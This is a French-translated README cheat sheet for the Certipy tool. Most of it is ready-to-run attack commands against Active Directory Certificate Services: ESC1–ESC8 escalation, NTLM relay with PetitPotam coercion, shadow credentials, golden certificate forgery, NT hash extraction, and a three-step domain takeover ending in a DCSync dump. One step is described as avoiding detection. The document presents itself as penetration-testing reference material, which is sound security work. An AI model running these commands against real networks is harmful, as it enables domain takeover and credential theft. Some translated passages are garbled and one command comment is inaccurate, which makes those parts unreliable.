<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏛️ Certipy - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
  ██║     █████╗  ██████╔╝   ██║   ██║██████╔╝ ╚████╔╝ 
  ██║     ██╔══╝  ██╔══██╗   ██║   ██║██╔═══╝   ╚██╔╝  
  ╚██████╗███████╗██║  ██║   ██║   ██║██║        ██║   
   ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
       Active Directory Certificate Services (AD CS) Abuse
```
<p align="center">
  <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
  <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerabilities-red?style=for-the-badge" alt="ESC1-ESC15">
  <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
  <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
</p>

<p align="center">
  <b>🔑 Outil complet pour énumérer et exploiter les mauvaises configurations des services de certificats Active Directory (AD CS)</b>
</p>

---

## 📋 Table des matières

- [Introduction](#-introduction)
- [Pourquoi AD CS Abuse ?](#-why-ad-cs-abuse)
- [Installation](#-installation)
- [Présentation des sous-commandes Certipy](#-certipy-subcommands-overview)
- [Énumération et découverte (`find`)](#-enumeration--discovery-find)
- [La matrice de vulnérabilité ESC](#-the-esc-vulnerability-matrix)
  - [ESC1 : Nom alternatif du sujet des fournitures des inscrits (SAN)] (#esc1-enrollee-supplies-subject-alt-name-san)
  - [ESC2 : EKU ou SubCA à tout usage](#esc2-any-Purpose-eku-or-subca)
  - [ESC3 : Agent de demande de certificat](#esc3-certificate-request-agent)
  - [ESC4 : Contrôle d'accès aux modèles vulnérables (ACL)](#esc4-vulnerable-template-access-control-acl)
  - [ESC6 : EDITF_ATTRIBUTESUBJECTALTNAME2 activé](#esc6-editf_attributesubjectaltname2-enabled)
  - [ESC7 : Contrôle d'accès des autorités de certification vulnérables](#esc7-vulnerable-ca-access-control)
  - [ESC8 : Relais NTLM vers inscription Web HTTP](#esc8-ntlm-relay-to-http-web-enrollment)
  - [ESC9 et ESC10 : défauts de mappage de certificat forts](#esc9--esc10-strong-certificate-mapping-flaws)
- [Identifiants Shadow (`shadow`)](#-shadow-credentials-shadow)
- [Certificats d'or (`forge`)](#-golden-certificates-forge)
- [Authentification avec PFX (`auth`)](#-authenticating-with-pfx-auth)
- [Flux de travail d'attaque du monde réel](#-real-world-attack-workflows)
- [Tableau de référence rapide](#-quick-reference-table)
- [Conseils et bonnes pratiques](#-conseils--meilleures pratiques)
- [Mentions légales](#-legal-disclaimer)
- [Ressources](#-ressources)

---

## 🎯Présentation

**Certipy** (créé par Oliver Lyak) est le premier outil basé sur Python pour énumérer et exploiter les services de certificats Active Directory (**AD CS**). AD CS est l'implémentation de l'infrastructure à clé publique (PKI) de Microsoft pour les réseaux Active Directory d'entreprise, largement utilisée pour la connexion par carte à puce, les VPN, S/MIME et le cryptage TLS interne.

Étant donné que les erreurs de configuration des certificats permettent fréquemment aux utilisateurs de domaine non privilégiés de demander des certificats en tant qu'administrateurs de domaine ou contrôleurs de domaine, l'abus d'AD CS représente l'un des vecteurs de remontée de domaine les plus fiables et les plus impactants dans les tests d'intrusion d'entreprise modernes.

---

## ⚖️Pourquoi abuser d'AD CS ?

- ⚡ **Escalade instantanée de domaine :** Les modèles de certificats mal configurés autorisent souvent une compromission à l'échelle du domaine en quelques secondes.
- 🔑 **Furtif et persistant :** Les certificats volés ou les Golden Certificates falsifiés peuvent rester valides pendant des années sans déclencher d'alertes standard de changement de mot de passe.
- 🔄 **PKINIT vers NT Hash :** Certipy authentifie les certificats `.pfx` demandés via Kerberos PKINIT, récupérant le hachage NT en texte brut de la cible directement à partir du KDC.

---

## 📥Installation

### Utilisation de pipx (recommandé)
```bash
pipx install certipy-ad
```
### Depuis le référentiel GitHub
```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```
### Vérification
```bash
certipy -h
```
---

## 🧭 Présentation des sous-commandes Certipy

| Sous-commande | Fonction |
|------------|----------|
| `find` | Énumérer les autorités de certification, les modèles et détecter les vulnérabilités ESC |
| `req` | Demander des certificats à partir de modèles vulnérables |
| `auth` | Authentifiez-vous à l'aide des certificats `.pfx` pour récupérer le hachage TGT et NT |
| `ca` | Énumérer et modifier les paramètres de configuration de l'autorité de certification |
| `template` | Modifier les paramètres du modèle de certificat (utile dans ESC4) |
| `account` | Gérer les comptes d'ordinateurs Active Directory (MachineAccountQuota) |
| `shadow` | Exploiter les informations d'identification Shadow (`msDS-KeyCredentialLink`) |
| `forge` | Forgez des Golden Certificates à l'aide d'une clé privée d'autorité de certification volée |

---

## 🔍 Énumération et découverte (`find`)

Commencez par identifier l’autorité de certification d’entreprise (CA) et recherchez les modèles vulnérables :
```bash
# Enumerate all CAs and templates with standard credentials
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1

# Print vulnerable templates directly to terminal
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulnerable -stdout

# Output results formatted for BloodHound
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
```
---

## 💥 La matrice de vulnérabilité ESC

### ESC1 : Nom alternatif du sujet des fournitures de l'inscrit (SAN)

**État :**
- Les utilisateurs peu privilégiés disposent de droits d'inscription (`Client Authentication` EKU activé).
- Le modèle spécifie `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (permet au demandeur de spécifier n'importe quel autre nom de sujet, tel que l'administrateur de domaine).

**Exploitation:**
```bash
# 1. Request certificate on behalf of Domain Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# 2. Authenticate with resulting administrator.pfx via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
*La sortie produit le TGT de l'administrateur et le hachage NT en texte brut !*

---

### ESC2 : EKU ou SubCA à tout usage

**État :**
- Le modèle spécifie `Any Purpose` EKU ou n'a pas d'EKU défini.
- Peut être utilisé à n'importe quelle fin, y compris l'authentification du client.

**Exploitation :**
Exploité à l'identique de ESC1 ou utilisé en combinaison avec ESC3 pour obtenir un certificat d'agent d'inscription.

---

### ESC3 : Agent de demande de certificat

**État :**
- Le modèle contient l'EKU `Certificate Request Agent` (agent d'inscription).
- Permet de demander des certificats au nom d'un autre utilisateur via des modèles secondaires.

**Exploitation:**
```bash
# 1. Request Enrollment Agent certificate
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'AgentTemplate' -dc-ip 10.10.10.1

# 2. Use the agent certificate to request on behalf of Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx john.pfx -dc-ip 10.10.10.1

# 3. Authenticate with the obtained Administrator PFX
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
---

### ESC4 : Contrôle d'accès aux modèles vulnérables (ACL)

**État :**
- L'utilisateur disposant de faibles privilèges dispose des droits `WriteOwner`, `WriteDacl` ou `WriteProperty` sur un modèle de certificat.

**Exploitation:**
```bash
# 1. Overwrite template configuration to make it vulnerable to ESC1
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.1

# 2. Request certificate as Administrator (ESC1)
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1

# 3. Restore original template configuration to avoid detection
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json -dc-ip 10.10.10.1
```
---

### ESC6 : EDITF_ATTRIBUTESUBJECTALTNAME2 activé

**État :**
- L'autorité de certification dispose de l'indicateur `EDITF_ATTRIBUTESUBJECTALTNAME2`, permettant à toute demande de certificat de spécifier des SAN arbitraires, quels que soient les paramètres du modèle !

**Exploitation:**
```bash
# Request certificate as Administrator using any template allowing Client Auth (e.g. default 'User')
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1
```
---

### ESC7 : Contrôle d'accès de l'autorité de certification vulnérable

**État :**
- L'utilisateur dispose des droits `ManageCA` ou `ManageCertificates` sur l'AC elle-même.

**Exploitation:**
```bash
# 1. Add yourself as Officer on the CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -add-officer 'john.doe' -dc-ip 10.10.10.1

# 2. Enable vulnerable template on CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA' -dc-ip 10.10.10.1

# 3. Issue and retrieve previously denied request
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
```
---

### ESC8 : Relais NTLM vers inscription Web HTTP

**État :**
- L'autorité de certification dispose du point de terminaison HTTP Web Enrollment (`/certsrv/`) activé avec l'authentification NTLM sans EPA (Extended Protection for Authentication) et HTTPS.

**Flux de travail d'exploitation :**
1. Démarrez `ntlmrelayx` en pointant vers CA Web Enrollment :
   ```bash
   impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```
2. Déclenchez l'authentification forcée de la machine via PetitPotam ou PrinterBug :
   ```bash
   python3 petitpotam.py 192.168.1.100 10.10.10.1
   ```
3. `ntlmrelayx` relaie l'authentification NTLM du compte machine du DC, demande un certificat informatique et génère `.pfx` base64.
4. Authentifiez-vous en tant que contrôleur de domaine à l'aide de Certipy :
   ```bash
   certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
   ```
5. Utilisez le hachage NT du contrôleur de domaine pour effectuer un vidage DCSync complet avec `impacket-secretsdump`.

---

## 👥 Identifiants Shadow (`shadow`)

Si un compte compromis dispose d'un accès en écriture sur l'attribut `msDS-KeyCredentialLink` d'un autre compte :
```bash
# Automatically write key credential, authenticate via PKINIT, and recover target NT hash
certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
  -account 'TARGET_USER' \
  -dc-ip 10.10.10.1
```
---

## 👑 Certificats d'or (`forge`)

Si vous avez compromis l'autorité de certification et extrait sa clé privée :
```bash
# Forge a Golden Certificate valid for any user without contacting the CA
certipy forge -ca-pfx ca_private.pfx \
  -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```
---

## 🔑 Authentification avec PFX (`auth`)
```bash
# Retrieve TGT and NT hash via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Save TGT to ccache for Kerberos ticketing
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```
---

## 🎬 Workflows d'attaque réels

### Terminez la reprise de domaine ESC1 en 3 commandes
```bash
# Step 1: Discover ESC1 template
certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Step 2: Request certificate as Administrator
certipy req -u 'alice@domain.local' -p 'Summer2026!' \
  -ca 'Domain-CA' \
  -template 'SmartCardUser' \
  -upn 'administrator@domain.local' \
  -dc-ip 10.10.10.1

# Step 3: Extract NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 4: Full DCSync dump
impacket-secretsdump -hashes :<EXTRACTED_NT_HASH> 'domain.local/administrator@10.10.10.1'
```
---

## 📊 Tableau de référence rapide

| Tâche | Commande |
|------|--------------|
| **Énumérer AD CS** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
| **Demande de certificat (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
| **Authentifier PFX** | `certipy auth -pfx <file>.pfx -dc-ip <IP>` |
| **Modifier le modèle (ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
| **Identifiants Shadow** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
| **Gérer les droits de l'autorité de certification** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
| **Forger le certificat d'or** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |

---

## 💡 Conseils et bonnes pratiques

1. **Vérifiez la synchronisation de l'horloge CC :**
   Kerberos PKINIT nécessite que l'heure de votre système soit synchronisée dans les 5 minutes suivant le contrôleur de domaine. Courir:
   ```bash
   sudo rdate -n 10.10.10.1
   # or
   sudo ntpdate 10.10.10.1
   ```
2. **Gérer KDC_ERR_PADATA_TYPE_NOSUPP :**
   Si `certipy auth` échoue avec cette erreur, le contrôleur de domaine ne dispose pas d'un certificat de contrôleur de domaine valide installé pour PKINIT. Dans ce cas, utilisez l'authentification LDAP ou SChannel.
3. **Toujours nettoyer les modèles ESC4 :**
   Lorsque vous modifiez des modèles de certificat, conservez et réappliquez toujours la configuration de sauvegarde (`-configuration <FILE>.json`) pour éviter de laisser l'environnement vulnérable ou de provoquer des pannes opérationnelles.

---

## ⚠️ Mentions légales

> **IMPORTANT :** Les attaques des services de certificats Active Directory accordent un accès administratif critique et à fort impact sur les réseaux de domaine. Certipy ne doit être exécuté que lors de tests d'intrusion autorisés, d'exercices d'équipe rouge et d'audits de sécurité éthique avec autorisation écrite.

---

## 📚 Ressources

- [Dépôt GitHub officiel Certipy](https://github.com/ly4k/Certipy)
- [Livre blanc d'occasion certifié (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Chemins d'attaque et protections AD CS (Oliver Lyak)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)